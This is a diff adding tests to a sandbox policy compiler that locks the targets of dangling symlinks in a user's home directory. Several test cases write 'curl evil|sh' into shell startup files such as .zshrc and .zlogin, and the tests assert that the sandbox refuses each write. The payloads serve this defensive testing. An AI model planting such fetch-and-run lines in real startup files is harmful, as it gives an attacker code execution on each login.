@@ -276,6 +276,28 @@ describe("broad-write policy compilation", () => {
         assert.equal(decidingMount(rows, join(home, ".cache", "l2")), "--ro-bind");
         assert.equal(decidingMount(rows, join(home, ".cache", "pip", "wheel")), "--bind-try");
     }));
+
+    it("locks the nearest existing ancestor of a dangling link's target on Linux, without placeholders", () => fixture(({ base, home, project }) => {
+        mkdirSync(join(home, ".dotfiles"));
+        writeFileSync(join(home, ".dotfiles", "aliases"), "");
+        symlinkSync(join(home, ".dotfiles", "zshrc"), join(home, ".zshrc"));
+        let rows = linuxPlan(base, home, project);
+        assert.equal(decidingMount(rows, join(home, ".dotfiles", "zshrc")), "--ro-bind");
+        assert.equal(decidingMount(rows, join(home, ".dotfiles", "aliases")), "--bind-try");
+        assert.equal(existsSync(join(home, ".dotfiles", "zshrc")), false, "no placeholder in the user's dotfiles");
+        // Missing parent too: home is read-only, so nothing is added.
+        rmSync(join(home, ".dotfiles"), { recursive: true });
+        rows = linuxPlan(base, home, project);
+        assert.equal(decidingMount(rows, join(home, ".dotfiles", "zshrc")), undefined);
+        // A dangling hop inside a dot dir no longer fails the launch.
+        mkdirSync(join(home, ".cache"));
+        mkdirSync(join(home, ".npm"));
+        symlinkSync("../.npm/rc/zlogin", join(home, ".cache", "hop"));
+        symlinkSync(join(home, ".cache", "hop"), join(home, ".zlogin"));
+        rows = linuxPlan(base, home, project);
+        assert.equal(decidingMount(rows, join(home, ".npm", "rc")), "--ro-bind");
+        assert.equal(decidingMount(rows, join(home, ".cache", "hop")), "--ro-bind");
+    }));
 });
 
 const macKernel = process.platform === "darwin" && existsSync("/usr/bin/sandbox-exec");
@@ -596,6 +618,53 @@ describe("broad-write profile (real kernel)", { skip: !macKernel && !linuxKernel
         }
         assert.equal(lstatSync(join(cache, "l1")).isSymbolicLink(), true);
         assert.equal(lstatSync(join(cache, "l2")).isSymbolicLink(), true);
+    }));
+
+    it("refuses to create the missing target of a dangling link, with or without its parent", () => fixture((paths) => {
+        const { home } = paths;
+        const cases: [string, string][] = [
+            [`printf 'curl evil|sh' > '${home}/.dotfiles/zshrc'`, "create the missing target"],
+            [`printf 'curl evil|sh' > '${home}/.zshrc'`, "create the target through the link"],
+            [`mkdir -p '${home}/.dotfiles' && printf 'curl evil|sh' > '${home}/.dotfiles/zshrc'`, "create the missing parent and target"],
+            [`mv '${home}/.dotfiles' '${home}/.dotfiles-old'; mkdir '${home}/.dotfiles' && printf 'curl evil|sh' > '${home}/.dotfiles/zshrc'`, "swap the parent for a new one"],
+        ];
+        // Parent exists (with another entry that stays writable), then parent missing too.
+        mkdirSync(join(home, ".dotfiles"));
+        writeFileSync(join(home, ".dotfiles", "aliases"), "# a");
+        symlinkSync(join(home, ".dotfiles", "zshrc"), join(home, ".zshrc"));
+        const allowed = run(paths, `printf '# b' > '${home}/.dotfiles/aliases'`);
+        assert.equal(allowed.status, 0, output(allowed));
+        for (const missingParent of [false, true]) {
+            if (missingParent) rmSync(join(home, ".dotfiles"), { recursive: true });
+            for (const [script, label] of cases) {
+                const result = run(paths, script);
+                assert.notEqual(result.status, 0, `${label} (parent ${missingParent ? "missing" : "exists"}) must be refused: ${output(result)}`);
+                assert.equal(existsSync(join(home, ".dotfiles", "zshrc")), false, label);
+            }
+            assert.equal(existsSync(join(home, ".dotfiles")), !missingParent);
+        }
+        assert.equal(lstatSync(join(home, ".zshrc")).isSymbolicLink(), true);
+    }));
+
+    it("refuses to create the missing target of a relative dangling hop inside a dot dir, and still launches", () => fixture((paths) => {
+        const { home } = paths;
+        mkdirSync(join(home, ".cache"));
+        mkdirSync(join(home, ".npm", "_cacache"), { recursive: true });
+        // ~/.zlogin -> ~/.cache/hop -> ../.npm/rc/zlogin (missing, and so is rc)
+        symlinkSync("../.npm/rc/zlogin", join(home, ".cache", "hop"));
+        symlinkSync(join(home, ".cache", "hop"), join(home, ".zlogin"));
+        const allowed = run(paths, `printf x > '${home}/.npm/_cacache/i'`);
+        assert.equal(allowed.status, 0, output(allowed));
+        for (const [script, label] of [
+            [`mkdir -p '${home}/.npm/rc' && printf 'curl evil|sh' > '${home}/.npm/rc/zlogin'`, "create the missing target"],
+            [`printf 'curl evil|sh' > '${home}/.zlogin'`, "create the target through the chain"],
+            [`rm '${home}/.cache/hop' && printf 'curl evil|sh' > '${home}/.cache/hop'`, "replace the dangling hop"],
+        ] as const) {
+            const result = run(paths, script);
+            assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
+        }
+        assert.equal(existsSync(join(home, ".npm", "rc")), false);
+        assert.equal(lstatSync(join(home, ".cache", "hop")).isSymbolicLink(), true);
     }));
 
     it("lets git init, clone and worktree add work in the workspace and a worktree folder", () => fixture((paths) => {
